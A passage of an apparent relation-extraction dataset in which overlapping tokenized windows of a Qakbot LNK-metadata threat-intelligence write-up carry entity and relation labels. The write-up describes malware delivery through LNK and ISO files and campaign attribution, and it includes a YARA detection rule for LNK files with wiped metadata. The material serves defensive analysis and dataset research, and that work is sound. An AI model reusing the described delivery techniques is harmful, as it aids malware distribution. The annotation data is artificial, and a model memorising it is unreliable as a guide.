")", "==", "0x0", "and", "//", "AccessTime", "==", "0x0uint16", "(", "0x2c", ")", "==", "0x0", "and", "//", "WriteTime", "==", "0x0//", "To", "target", "specific", "families", "we", "can", "add", "additional", "check"]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [8, 8], "name": "Shell Link binary file", "pos": [8, 12], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [24, 24], "name": "LNK", "pos": [24, 25], "index": "1_0"}], [{"type": "TP", "sent_id": 0, "global_pos": [39, 39], "name": "Operating System", "pos": [39, 41], "index": "2_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [54, 54], "name": "LNK structure", "pos": [1, 3], "index": "3_0"}], [{"type": "SF", "sent_id": 2, "global_pos": [95, 95], "name": "LNK file", "pos": [11, 13], "index": "4_0"}], [{"type": "SF", "sent_id": 3, "global_pos": [131, 131], "name": "LNK file", "pos": [19, 21], "index": "5_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [159, 159], "name": "Quantum Builder", "pos": [0, 2], "index": "6_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [164, 164], "name": "Quantum builder", "pos": [5, 7], "index": "7_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [174, 174], "name": "Quantum Builder", "pos": [15, 17], "index": "8_0"}], [{"type": "SF", "sent_id": 4, "global_pos": [187, 187], "name": "LNK file", "pos": [28, 30], "index": "9_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [224, 224], "name": "LNK", "pos": [5, 6], "index": "10_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [230, 230], "name": "DLL file", "pos": [11, 13], "index": "11_0"}]], "labels": [{"r": "RD", "evidence": [0, 1], "h": 2, "t": 3}, {"r": "CO", "evidence": [0], "h": 0, "t": 1}, {"r": "CO", "evidence": [0, 1], "h": 0, "t": 3}, {"r": "CO", "evidence": [2, 3], "h": 4, "t": 5}, {"r": "EX", "evidence": [4], "h": 6, "t": 7}, {"r": "RD", "evidence": [4], "h": 6, "t": 9}, {"r": "RD", "evidence": [4], "h": 8, "t": 9}, {"r": "WR", "evidence": [4], "h": 8, "t": 9}, {"r": "WR", "evidence": [4, 5, 6], "h": 6, "t": 10}, {"r": "WR", "evidence": [4, 5, 6], "h": 6, "t": 11}, {"r": "CO", "evidence": [4], "h": 6, "t": 8}]}, {"title": "058-1", "sents": [["The", "LNK", "structure", "stores", "information", "about", "the", "target", "object", "as", "well", "as", "other", "related", "information", "about", "the", "application", "behavior", "and", "metadata", "from", "the", "machine", "where", "the", "LNK", "file", "was", "created", "."], ["Sometimes", ",", "when", "the", "target", "information", "is", "not", "present", "on", "the", "LNK", "file", ",", "we", "might", "need", "to", "look", "at", "the", "Metadata", "Store", "structure", "for", "additional", "data", "."], ["SharPersist", "PayloadFigure", "1", ":", "SharPersist", "payloadIn", "Figure", "1", "we", "can", "see", "the", "MAC", "timestamps", "are", "empty", ",", "but", "the", "LNK", "file", "still", "contains", "information", "about", "the", "relative", "path", "where", "the", "file", "was", "created", ",", "as", "well", "as", "the", "SID", "of", "the", "user", "who", "created", "the", "file", "."], ["Quantum", "Builder", "PayloadFigure", "2", ":", "Quantum", "builder", "payloadIn", "Figure", "2", ",", "we", "can", "see", "the", "Quantum", "Builder", "does", "not", "attempt", "to", "wipe", "out", "any", "metadata", "and", "the", "generated", "LNK", "file", "contains", "a", "trove", "of", "metadata", "about", "the", "system", "where", "it", "was", "created", "."], ["A", "quick", "search", "for", "that", "MAC", "address", "indicates", "it", "is", "from", "a", "VMWare", "virtual", "network", "card", "."], ["In", "Figure", "3", ",", "the", "LNK", "target", "is", "pointing", "to", "a", "DLL", "file", "on", "a", "remote", "share", "but", "since", "this", "is", "a", "malformed", "file", "created", "to", "exploit", "a", "bug", ",", "the", "parsing", "tools", "can", "not", "see", "the", "payload", "."], ["A", "simple", "YARA", "rule", "could", "be", "used", "to", "detect", "such", "samples", ":", "rule", "lnk_wiped", "{", "meta", ":", "author=", "''", "gvenere", "''", "description=", "''", "LNK", "with", "wiped", "metadata", "''", "strings", ":", "$", "lnk_magic", "=", "{", "4c", "00", "00", "00", "}", "$", "ext1", "=", "``", ".js", "''", "//", "additional", "strings", "to", "search", "$", "ext2", "=", "``", ".bat", "''", "//", "in", "the", "LNK", "target", "area", "$", "ext3", "=", "``", ".cmd", "''", "//", "These", "are", "for", "Qakbotcondition", ":", "$", "lnk_magic", "at", "0x0", "anduint16", "(", "0x1c", ")", "==", "0x0", "and", "//", "CreationTime", "==", "0x0uint16", "(", "0x24", ")", "==", "0x0", "and", "//", "AccessTime", "==", "0x0uint16", "(", "0x2c", ")", "==", "0x0", "and", "//", "WriteTime", "==", "0x0//", "To", "target", "specific", "families", "we", "can", "add", "additional", "check"], ["0x100", ")", ")", "}", "Other", "tools", "use", "the", "proper", "methods", "to", "create", "these", "files", ",", "but", "that", "opens", "an", "opportunity", "to", "identify", "information", "specific", "to", "the", "machine", "where", "the", "sample", "was", "created", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [1, 1], "name": "LNK structure", "pos": [1, 3], "index": "0_0"}], [{"type": "SF", "sent_id": 1, "global_pos": [42, 42], "name": "LNK file", "pos": [11, 13], "index": "1_0"}], [{"type": "SF", "sent_id": 2, "global_pos": [78, 78], "name": "LNK file", "pos": [19, 21], "index": "2_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [106, 106], "name": "Quantum Builder", "pos": [0, 2], "index": "3_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [111, 111], "name": "Quantum builder", "pos": [5, 7], "index": "4_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [121, 121], "name": "Quantum Builder", "pos": [15, 17], "index": "5_0"}], [{"type": "SF", "sent_id": 3, "global_pos": [134, 134], "name": "LNK file", "pos": [28, 30], "index": "6_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [171, 171], "name": "LNK", "pos": [5, 6], "index": "7_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [177, 177], "name": "DLL file", "pos": [11, 13], "index": "8_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [335, 335], "name": "these files", "pos": [12, 14], "index": "9_0"}]], "labels": [{"r": "CO", "evidence": [1, 2], "h": 1, "t": 2}, {"r": "EX", "evidence": [3], "h": 3, "t": 4}, {"r": "RD", "evidence": [3], "h": 3, "t": 6}, {"r": "RD", "evidence": [3], "h": 5, "t": 6}, {"r": "WR", "evidence": [3], "h": 5, "t": 6}, {"r": "WR", "evidence": [3, 4, 5], "h": 3, "t": 7}, {"r": "WR", "evidence": [3, 4, 5], "h": 3, "t": 8}, {"r": "WR", "evidence": [3, 4, 5, 6, 7], "h": 3, "t": 9}, {"r": "CO", "evidence": [3], "h": 3, "t": 5}]}, {"title": "058-2", "sents": [["Sometimes", ",", "when", "the", "target", "information", "is", "not", "present", "on", "the", "LNK", "file", ",", "we", "might", "need", "to", "look", "at", "the", "Metadata", "Store", "structure", "for", "additional", "data", "."], ["SharPersist", "PayloadFigure", "1", ":", "SharPersist", "payloadIn", "Figure", "1", "we", "can", "see", "the", "MAC", "timestamps", "are", "empty", ",", "but", "the", "LNK", "file", "still", "contains", "information", "about", "the", "relative", "path", "where", "the", "file", "was", "created", ",", "as", "well", "as", "the", "SID", "of", "the", "user", "who", "created", "the", "file", "."], ["Quantum", "Builder", "PayloadFigure", "2", ":", "Quantum", "builder", "payloadIn", "Figure", "2", ",", "we", "can", "see", "the", "Quantum", "Builder", "does", "not", "attempt", "to", "wipe", "out", "any", "metadata", "and", "the", "generated", "LNK", "file", "contains", "a", "trove", "of", "metadata", "about", "the", "system", "where", "it", "was", "created", "."], ["A", "quick", "search", "for", "that", "MAC", "address", "indicates", "it", "is", "from", "a", "VMWare", "virtual", "network", "card", "."], ["In", "Figure", "3", ",", "the", "LNK", "target", "is", "pointing", "to", "a", "DLL", "file", "on", "a", "remote", "share", "but", "since", "this", "is", "a", "malformed", "file", "created", "to", "exploit", "a", "bug", ",", "the", "parsing", "tools", "can", "not", "see", "the", "payload", "."], ["A", "simple", "YARA", "rule", "could", "be", "used", "to", "detect", "such", "samples", ":", "rule", "lnk_wiped", "{", "meta", ":", "author=", "''", "gvenere", "''", "description=", "''", "LNK", "with", "wiped", "metadata", "''", "strings", ":", "$", "lnk_magic", "=", "{", "4c", "00", "00", "00", "}", "$", "ext1", "=", "``", ".js", "''", "//", "additional", "strings", "to", "search", "$", "ext2", "=", "``", ".bat", "''", "//", "in", "the", "LNK", "target", "area", "$", "ext3", "=", "``", ".cmd", "''", "//", "These", "are", "for", "Qakbotcondition", ":", "$", "lnk_magic", "at", "0x0", "anduint16", "(", "0x1c", ")", "==", "0x0", "and", "//", "CreationTime", "==", "0x0uint16", "(", "0x24", ")", "==", "0x0", "and", "//", "AccessTime", "==", "0x0uint16", "(", "0x2c", ")", "==", "0x0", "and", "//", "WriteTime", "==", "0x0//", "To", "target", "specific", "families", "we", "can", "add", "additional", "check"], ["0x100", ")", ")", "}", "Other", "tools", "use", "the", "proper", "methods", "to", "create", "these", "files", ",", "but", "that", "opens", "an", "opportunity", "to", "identify", "information", "specific", "to", "the", "machine", "where", "the", "sample", "was", "created", "."], ["In", "general", ",", "LNK", "files", "are", "used", "by", "worm", "type", "malware", "like", "Raspberry", "Robin", "in", "order", "to", "spread", "to", "removable", "disks", "or", "network", "shares", "."]], "vertexSet": [[{"type": "SF", "sent_id": 0, "global_pos": [11, 11], "name": "LNK file", "pos": [11, 13], "index": "0_0"}], [{"type": "SF", "sent_id": 1, "global_pos": [47, 47], "name": "LNK file", "pos": [19, 21], "index": "1_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [75, 75], "name": "Quantum Builder", "pos": [0, 2], "index": "2_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [80, 80], "name": "Quantum builder", "pos": [5, 7], "index": "3_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [90, 90], "name": "Quantum Builder", "pos": [15, 17], "index": "4_0"}], [{"type": "SF", "sent_id": 2, "global_pos": [103, 103], "name": "LNK file", "pos": [28, 30], "index": "5_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [140, 140], "name": "LNK", "pos": [5, 6], "index": "6_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [146, 146], "name": "DLL file", "pos": [11, 13], "index": "7_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [304, 304], "name": "these files", "pos": [12, 14], "index": "8_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [328, 328], "name": "LNK files", "pos": [3, 5], "index": "9_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [337, 337], "name": "Raspberry Robin", "pos": [12, 14], "index": "10_0"}]], "labels": [{"r": "CO", "evidence": [0, 1], "h": 0, "t": 1}, {"r": "EX", "evidence": [2], "h": 2, "t": 3}, {"r": "RD", "evidence": [2], "h": 2, "t": 5}, {"r": "RD", "evidence": [2], "h": 4, "t": 5}, {"r": "WR", "evidence": [2], "h": 4, "t": 5}, {"r": "WR", "evidence": [2, 3, 4], "h": 2, "t": 6}, {"r": "WR", "evidence": [2, 3, 4], "h": 2, "t": 7}, {"r": "WR", "evidence": [2, 3, 4, 5, 6], "h": 2, "t": 8}, {"r": "CO", "evidence": [2], "h": 2, "t": 4}, {"r": "WR", "evidence": [4, 5, 6, 7], "t": 6, "h": 10}, {"r": "WR", "evidence": [4, 5, 6, 7], "t": 7, "h": 10}, {"r": "WR", "evidence": [6, 7], "t": 8, "h": 10}, {"r": "WR", "evidence": [6, 7], "t": 8, "h": 10}]}, {"title": "058-3", "sents": [["SharPersist", "PayloadFigure", "1", ":", "SharPersist", "payloadIn", "Figure", "1", "we", "can", "see", "the", "MAC", "timestamps", "are", "empty", ",", "but", "the", "LNK", "file", "still", "contains", "information", "about", "the", "relative", "path", "where", "the", "file", "was", "created", ",", "as", "well", "as", "the", "SID", "of", "the", "user", "who", "created", "the", "file", "."], ["Quantum", "Builder", "PayloadFigure", "2", ":", "Quantum", "builder", "payloadIn", "Figure", "2", ",", "we", "can", "see", "the", "Quantum", "Builder", "does", "not", "attempt", "to", "wipe", "out", "any", "metadata", "and", "the", "generated", "LNK", "file", "contains", "a", "trove", "of", "metadata", "about", "the", "system", "where", "it", "was", "created", "."], ["A", "quick", "search", "for", "that", "MAC", "address", "indicates", "it", "is", "from", "a", "VMWare", "virtual", "network", "card", "."], ["In", "Figure", "3", ",", "the", "LNK", "target", "is", "pointing", "to", "a", "DLL", "file", "on", "a", "remote", "share", "but", "since", "this", "is", "a", "malformed", "file", "created", "to", "exploit", "a", "bug", ",", "the", "parsing", "tools", "can", "not", "see", "the", "payload", "."], ["A", "simple", "YARA", "rule", "could", "be", "used", "to", "detect", "such", "samples", ":", "rule", "lnk_wiped", "{", "meta", ":", "author=", "''", "gvenere", "''", "description=", "''", "LNK", "with", "wiped", "metadata", "''", "strings", ":", "$", "lnk_magic", "=", "{", "4c", "00", "00", "00", "}", "$", "ext1", "=", "``", ".js", "''", "//", "additional", "strings", "to", "search", "$", "ext2", "=", "``", ".bat", "''", "//", "in", "the", "LNK", "target", "area", "$", "ext3", "=", "``", ".cmd", "''", "//", "These", "are", "for", "Qakbotcondition", ":", "$", "lnk_magic", "at", "0x0", "anduint16", "(", "0x1c", ")", "==", "0x0", "and", "//", "CreationTime", "==", "0x0uint16", "(", "0x24", ")", "==", "0x0", "and", "//", "AccessTime", "==", "0x0uint16", "(", "0x2c", ")", "==", "0x0", "and", "//", "WriteTime", "==", "0x0//", "To", "target", "specific", "families", "we", "can", "add", "additional", "check"], ["0x100", ")", ")", "}", "Other", "tools", "use", "the", "proper", "methods", "to", "create", "these", "files", ",", "but", "that", "opens", "an", "opportunity", "to", "identify", "information", "specific", "to", "the", "machine", "where", "the", "sample", "was", "created", "."], ["In", "general", ",", "LNK", "files", "are", "used", "by", "worm", "type", "malware", "like", "Raspberry", "Robin", "in", "order", "to", "spread", "to", "removable", "disks", "or", "network", "shares", "."], ["Source", ":", "VirusTotalInterestingly", ",", "many", "malicious", "LNK", "files", "submitted", "to", "VT", "during", "this", "period", "had", "all", "the", "metadata", "removed", "from", "the", "file", "."]], "vertexSet": [[{"type": "SF", "sent_id": 0, "global_pos": [19, 19], "name": "LNK file", "pos": [19, 21], "index": "0_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [47, 47], "name": "Quantum Builder", "pos": [0, 2], "index": "1_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [52, 52], "name": "Quantum builder", "pos": [5, 7], "index": "2_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [62, 62], "name": "Quantum Builder", "pos": [15, 17], "index": "3_0"}], [{"type": "SF", "sent_id": 1, "global_pos": [75, 75], "name": "LNK file", "pos": [28, 30], "index": "4_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [112, 112], "name": "LNK", "pos": [5, 6], "index": "5_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [118, 118], "name": "DLL file", "pos": [11, 13], "index": "6_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [276, 276], "name": "these files", "pos": [12, 14], "index": "7_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [300, 300], "name": "LNK files", "pos": [3, 5], "index": "8_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [309, 309], "name": "Raspberry Robin", "pos": [12, 14], "index": "9_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [328, 328], "name": "LNK files", "pos": [6, 8], "index": "10_0"}]], "labels": [{"r": "EX", "evidence": [1], "h": 1, "t": 2}, {"r": "RD", "evidence": [1], "h": 1, "t": 4}, {"r": "RD", "evidence": [1], "h": 3, "t": 4}, {"r": "WR", "evidence": [1], "h": 3, "t": 4}, {"r": "WR", "evidence": [1, 2, 3], "h": 1, "t": 5}, {"r": "WR", "evidence": [1, 2, 3], "h": 1, "t": 6}, {"r": "WR", "evidence": [1, 2, 3, 4, 5], "h": 1, "t": 7}, {"r": "CO", "evidence": [1], "h": 1, "t": 3}, {"r": "WR", "evidence": [3, 4, 5, 6], "t": 5, "h": 9}, {"r": "WR", "evidence": [3, 4, 5, 6], "t": 6, "h": 9}, {"r": "WR", "evidence": [5, 6], "t": 7, "h": 9}, {"r": "WR", "evidence": [5, 6], "t": 7, "h": 9}, {"r": "CO", "evidence": [6, 7], "h": 8, "t": 10}]}, {"title": "058-4", "sents": [["Quantum", "Builder", "PayloadFigure", "2", ":", "Quantum", "builder", "payloadIn", "Figure", "2", ",", "we", "can", "see", "the", "Quantum", "Builder", "does", "not", "attempt", "to", "wipe", "out", "any", "metadata", "and", "the", "generated", "LNK", "file", "contains", "a", "trove", "of", "metadata", "about", "the", "system", "where", "it", "was", "created", "."], ["A", "quick", "search", "for", "that", "MAC", "address", "indicates", "it", "is", "from", "a", "VMWare", "virtual", "network", "card", "."], ["In", "Figure", "3", ",", "the", "LNK", "target", "is", "pointing", "to", "a", "DLL", "file", "on", "a", "remote", "share", "but", "since", "this", "is", "a", "malformed", "file", "created", "to", "exploit", "a", "bug", ",", "the", "parsing", "tools", "can", "not", "see", "the", "payload", "."], ["A", "simple", "YARA", "rule", "could", "be", "used", "to", "detect", "such", "samples", ":", "rule", "lnk_wiped", "{", "meta", ":", "author=", "''", "gvenere", "''", "description=", "''", "LNK", "with", "wiped", "metadata", "''", "strings", ":", "$", "lnk_magic", "=", "{", "4c", "00", "00", "00", "}", "$", "ext1", "=", "``", ".js", "''", "//", "additional", "strings", "to", "search", "$", "ext2", "=", "``", ".bat", "''", "//", "in", "the", "LNK", "target", "area", "$", "ext3", "=", "``", ".cmd", "''", "//", "These", "are", "for", "Qakbotcondition", ":", "$", "lnk_magic", "at", "0x0", "anduint16", "(", "0x1c", ")", "==", "0x0", "and", "//", "CreationTime", "==", "0x0uint16", "(", "0x24", ")", "==", "0x0", "and", "//", "AccessTime", "==", "0x0uint16", "(", "0x2c", ")", "==", "0x0", "and", "//", "WriteTime", "==", "0x0//", "To", "target", "specific", "families", "we", "can", "add", "additional", "check"], ["0x100", ")", ")", "}", "Other", "tools", "use", "the", "proper", "methods", "to", "create", "these", "files", ",", "but", "that", "opens", "an", "opportunity", "to", "identify", "information", "specific", "to", "the", "machine", "where", "the", "sample", "was", "created", "."], ["In", "general", ",", "LNK", "files", "are", "used", "by", "worm", "type", "malware", "like", "Raspberry", "Robin", "in", "order", "to", "spread", "to", "removable", "disks", "or", "network", "shares", "."], ["Source", ":", "VirusTotalInterestingly", ",", "many", "malicious", "LNK", "files", "submitted", "to", "VT", "during", "this", "period", "had", "all", "the", "metadata", "removed", "from", "the", "file", "."], ["However", ",", "after", "Microsoft", "announced", "changes", "to", "how", "macros", "were", "executed", "by", "default", "on", "internet", "downloaded", "content", ",", "Talos", "found", "Qakbot", "increasingly", "moving", "away", "from", "the", "XLSB", "files", "in", "favor", "of", "ISO", "files", "containing", "a", "LNK", "file", ",", "which", "would", "download", "and", "execute", "the", "payload", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [0, 0], "name": "Quantum Builder", "pos": [0, 2], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [5, 5], "name": "Quantum builder", "pos": [5, 7], "index": "1_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [15, 15], "name": "Quantum Builder", "pos": [15, 17], "index": "2_0"}], [{"type": "SF", "sent_id": 0, "global_pos": [28, 28], "name": "LNK file", "pos": [28, 30], "index": "3_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [65, 65], "name": "LNK", "pos": [5, 6], "index": "4_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [71, 71], "name": "DLL file", "pos": [11, 13], "index": "5_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [229, 229], "name": "these files", "pos": [12, 14], "index": "6_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [253, 253], "name": "LNK files", "pos": [3, 5], "index": "7_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [262, 262], "name": "Raspberry Robin", "pos": [12, 14], "index": "8_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [281, 281], "name": "LNK files", "pos": [6, 8], "index": "9_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [318, 318], "name": "Qakbot", "pos": [20, 21], "index": "10_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [329, 329], "name": "ISO files", "pos": [31, 33], "index": "11_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [342, 342], "name": "payload", "pos": [44, 45], "index": "12_0"}]], "labels": [{"r": "EX", "evidence": [0], "h": 0, "t": 1}, {"r": "RD", "evidence": [0], "h": 0, "t": 3}, {"r": "RD", "evidence": [0], "h": 2, "t": 3}, {"r": "WR", "evidence": [0], "h": 2, "t": 3}, {"r": "WR", "evidence": [0, 1, 2], "h": 0, "t": 4}, {"r": "WR", "evidence": [0, 1, 2], "h": 0, "t": 5}, {"r": "WR", "evidence": [0, 1, 2, 3, 4], "h": 0, "t": 6}, {"r": "CO", "evidence": [0], "h": 0, "t": 2}, {"r": "WR", "evidence": [2, 3, 4, 5], "t": 4, "h": 8}, {"r": "WR", "evidence": [2, 3, 4, 5], "t": 5, "h": 8}, {"r": "WR", "evidence": [4, 5], "t": 6, "h": 8}, {"r": "WR", "evidence": [4, 5], "t": 6, "h": 8}, {"r": "CO", "evidence": [5, 6], "h": 7, "t": 9}, {"r": "FR", "evidence": [7], "h": 10, "t": 11}, {"r": "WR", "evidence": [7], "h": 11, "t": 12}, {"r": "EX", "evidence": [7], "h": 11, "t": 12}]}, {"title": "058-5", "sents": [["A", "quick", "search", "for", "that", "MAC", "address", "indicates", "it", "is", "from", "a", "VMWare", "virtual", "network", "card", "."], ["In", "Figure", "3", ",", "the", "LNK", "target", "is", "pointing", "to", "a", "DLL", "file", "on", "a", "remote", "share", "but", "since", "this", "is", "a", "malformed", "file", "created", "to", "exploit", "a", "bug", ",", "the", "parsing", "tools", "can", "not", "see", "the", "payload", "."], ["A", "simple", "YARA", "rule", "could", "be", "used", "to", "detect", "such", "samples", ":", "rule", "lnk_wiped", "{", "meta", ":", "author=", "''", "gvenere", "''", "description=", "''", "LNK", "with", "wiped", "metadata", "''", "strings", ":", "$", "lnk_magic", "=", "{", "4c", "00", "00", "00", "}", "$", "ext1", "=", "``", ".js", "''", "//", "additional", "strings", "to", "search", "$", "ext2", "=", "``", ".bat", "''", "//", "in", "the", "LNK", "target", "area", "$", "ext3", "=", "``", ".cmd", "''", "//", "These", "are", "for", "Qakbotcondition", ":", "$", "lnk_magic", "at", "0x0", "anduint16", "(", "0x1c", ")", "==", "0x0", "and", "//", "CreationTime", "==", "0x0uint16", "(", "0x24", ")", "==", "0x0", "and", "//", "AccessTime", "==", "0x0uint16", "(", "0x2c", ")", "==", "0x0", "and", "//", "WriteTime", "==", "0x0//", "To", "target", "specific", "families", "we", "can", "add", "additional", "check"], ["0x100", ")", ")", "}", "Other", "tools", "use", "the", "proper", "methods", "to", "create", "these", "files", ",", "but", "that", "opens", "an", "opportunity", "to", "identify", "information", "specific", "to", "the", "machine", "where", "the", "sample", "was", "created", "."], ["In", "general", ",", "LNK", "files", "are", "used", "by", "worm", "type", "malware", "like", "Raspberry", "Robin", "in", "order", "to", "spread", "to", "removable", "disks", "or", "network", "shares", "."], ["Source", ":", "VirusTotalInterestingly", ",", "many", "malicious", "LNK", "files", "submitted", "to", "VT", "during", "this", "period", "had", "all", "the", "metadata", "removed", "from", "the", "file", "."], ["However", ",", "after", "Microsoft", "announced", "changes", "to", "how", "macros", "were", "executed", "by", "default", "on", "internet", "downloaded", "content", ",", "Talos", "found", "Qakbot", "increasingly", "moving", "away", "from", "the", "XLSB", "files", "in", "favor", "of", "ISO", "files", "containing", "a", "LNK", "file", ",", "which", "would", "download", "and", "execute", "the", "payload", "."], ["Interestingly", ",", "at", "this", "point", "the", "``", "Obama", "''", "Qakbot", "campaign", "began", "wiping", "out", "the", "metadata", "on", "their", "LNK", "files", ",", "but", "the", "Target", "field", "always", "pointed", "to", "the", "JS", ",", "BAT", "or", "CMD", "file", "used", "to", "start", "the", "malicious", "DLL", "part", "of", "the", "initial", "infection", "chain", "(", "Figure", "9", ")", ":", "Figure", "9", ":", "Metadata", "for", "LNK", "files", "part", "of", "``", "Obama", "''", "campaignThe", "same", "behavior", "started", "to", "happen", "on", "``", "BB", "''", "campaign", "'", "s", "LNK", "files", "starting", "on", "September", "13th", "."]], "vertexSet": [[{"type": "MF", "sent_id": 1, "global_pos": [22, 22], "name": "LNK", "pos": [5, 6], "index": "0_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [28, 28], "name": "DLL file", "pos": [11, 13], "index": "1_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [186, 186], "name": "these files", "pos": [12, 14], "index": "2_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [210, 210], "name": "LNK files", "pos": [3, 5], "index": "3_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [219, 219], "name": "Raspberry Robin", "pos": [12, 14], "index": "4_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [238, 238], "name": "LNK files", "pos": [6, 8], "index": "5_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [275, 275], "name": "Qakbot", "pos": [20, 21], "index": "6_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [286, 286], "name": "ISO files", "pos": [31, 33], "index": "7_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [299, 299], "name": "payload", "pos": [44, 45], "index": "8_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [310, 310], "name": "Qakbot", "pos": [9, 10], "index": "9_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [319, 319], "name": "LNK files", "pos": [18, 20], "index": "10_0"}]], "labels": [{"r": "WR", "evidence": [1, 2, 3, 4], "t": 0, "h": 4}, {"r": "WR", "evidence": [1, 2, 3, 4], "t": 1, "h": 4}, {"r": "WR", "evidence": [3, 4], "t": 2, "h": 4}, {"r": "WR", "evidence": [3, 4], "t": 2, "h": 4}, {"r": "CO", "evidence": [4, 5], "h": 3, "t": 5}, {"r": "FR", "evidence": [6], "h": 6, "t": 7}, {"r": "WR", "evidence": [6], "h": 7, "t": 8}, {"r": "EX", "evidence": [6], "h": 7, "t": 8}, {"r": "UK", "evidence": [6, 7], "t": 8, "h": 9}, {"r": "WR", "evidence": [7], "h": 9, "t": 10}]}, {"title": "058-6", "sents": [["In", "Figure", "3", ",", "the", "LNK", "target", "is", "pointing", "to", "a", "DLL", "file", "on", "a", "remote", "share", "but", "since", "this", "is", "a", "malformed", "file", "created", "to", "exploit", "a", "bug", ",", "the", "parsing", "tools", "can", "not", "see", "the", "payload", "."], ["A", "simple", "YARA", "rule", "could", "be", "used", "to", "detect", "such", "samples", ":", "rule", "lnk_wiped", "{", "meta", ":", "author=", "''", "gvenere", "''", "description=", "''", "LNK", "with", "wiped", "metadata", "''", "strings", ":", "$", "lnk_magic", "=", "{", "4c", "00", "00", "00", "}", "$", "ext1", "=", "``", ".js", "''", "//", "additional", "strings", "to", "search", "$", "ext2", "=", "``", ".bat", "''", "//", "in", "the", "LNK", "target", "area", "$", "ext3", "=", "``", ".cmd", "''", "//", "These", "are", "for", "Qakbotcondition", ":", "$", "lnk_magic", "at", "0x0", "anduint16", "(", "0x1c", ")", "==", "0x0", "and", "//", "CreationTime", "==", "0x0uint16", "(", "0x24", ")", "==", "0x0", "and", "//", "AccessTime", "==", "0x0uint16", "(", "0x2c", ")", "==", "0x0", "and", "//", "WriteTime", "==", "0x0//", "To", "target", "specific", "families", "we", "can", "add", "additional", "check"], ["0x100", ")", ")", "}", "Other", "tools", "use", "the", "proper", "methods", "to", "create", "these", "files", ",", "but", "that", "opens", "an", "opportunity", "to", "identify", "information", "specific", "to", "the", "machine", "where", "the", "sample", "was", "created", "."], ["In", "general", ",", "LNK", "files", "are", "used", "by", "worm", "type", "malware", "like", "Raspberry", "Robin", "in", "order", "to", "spread", "to", "removable", "disks", "or", "network", "shares", "."], ["Source", ":", "VirusTotalInterestingly", ",", "many", "malicious", "LNK", "files", "submitted", "to", "VT", "during", "this", "period", "had", "all", "the", "metadata", "removed", "from", "the", "file", "."], ["However", ",", "after", "Microsoft", "announced", "changes", "to", "how", "macros", "were", "executed", "by", "default", "on", "internet", "downloaded", "content", ",", "Talos", "found", "Qakbot", "increasingly", "moving", "away", "from", "the", "XLSB", "files", "in", "favor", "of", "ISO", "files", "containing", "a", "LNK", "file", ",", "which", "would", "download", "and", "execute", "the", "payload", "."], ["Interestingly", ",", "at", "this", "point", "the", "``", "Obama", "''", "Qakbot", "campaign", "began", "wiping", "out", "the", "metadata", "on", "their", "LNK", "files", ",", "but", "the", "Target", "field", "always", "pointed", "to", "the", "JS", ",", "BAT", "or", "CMD", "file", "used", "to", "start", "the", "malicious", "DLL", "part", "of", "the", "initial", "infection", "chain", "(", "Figure", "9", ")", ":", "Figure", "9", ":", "Metadata", "for", "LNK", "files", "part", "of", "``", "Obama", "''", "campaignThe", "same", "behavior", "started", "to", "happen", "on", "``", "BB", "''", "campaign", "'", "s", "LNK", "files", "starting", "on", "September", "13th", "."], ["We", "can", "see", "in", "Figure", "10", "that", "samples", "mapped", "to", "the", "``", "BB", "''", "campaign", "in", "September", "still", "had", "Drive", "Serial", "Number", "information", ":", "Figure", "10", ":", "Metadata", "for", "LNK", "files", "part", "of", "``", "BB", "''", "campaignWe", "also", "observe", "that", "the", "Drive", "Serial", "Number", "matches", "the", "one", "used", "by", "the", "``", "AA", "''", "campaign", "from", "the", "May/July", "timeframe", ",", "which", "could", "indicate", "``", "AA", "''", "and", "``", "BB", "''", "are", "probably", "managed", "by", "the", "same", "group", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, 